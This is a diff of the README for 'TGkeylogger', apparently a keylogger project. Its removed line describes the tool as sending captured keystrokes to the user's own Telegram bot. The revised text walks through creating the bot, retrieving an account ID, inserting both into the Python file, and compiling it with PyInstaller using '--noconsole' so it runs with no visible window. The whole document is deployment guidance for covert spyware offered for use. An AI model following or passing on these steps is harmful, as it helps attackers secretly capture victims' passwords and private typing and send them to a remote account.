@@ -1,16 +1,33 @@
 # TGkeylogger
-TGkeylogger – a keylogger that regularly sends captured data directly to your Telegram bot
+Instructions:
 
-=========================================================
+Create Your Bot via Telegram BotFather:
 
-First, create your bot via Telegram’s official BotFather: https://t.me/BotFather
+Visit the official BotFather in Telegram.
 
-Click: /newbot.
+Type: /newbot.
 
-Choose a bot name, then a username (e.g., mytest_bot).
+Choose a bot name (e.g., "MyTestBot"), then a username ending with _bot (e.g., mytest_bot).
 
-After creation, copy your API token (to paste into your code later).
+After creation, copy your API token (save it to paste into your code later).
 
-Next, visit the official bot https://t.me/getmyid_bot to find your account ID, which must also be added to the code.
+Find Your Telegram Account ID:
 
-After editing the file with your data, convert the .py file to .exe by running this command in CMD: pyinstaller --onefile --noconsole TGkeylogger.py  
+Visit the official bot @getmyid_bot.
+
+Send /start to receive your Account ID (add this to your code as well).
+
+Modify the Code:
+
+Edit the .py file (e.g., TGkeylogger.py) with your API token and Account ID.
+
+Convert to .exe (Windows Only):
+
+Open CMD and run:
+
+bash
+Copy
+pyinstaller --onefile --noconsole TGkeylogger.py  
+The executable (TGkeylogger.exe) will be generated in the dist folder.
+
+Note: Ensure you use Windows for compiling the .exe file.
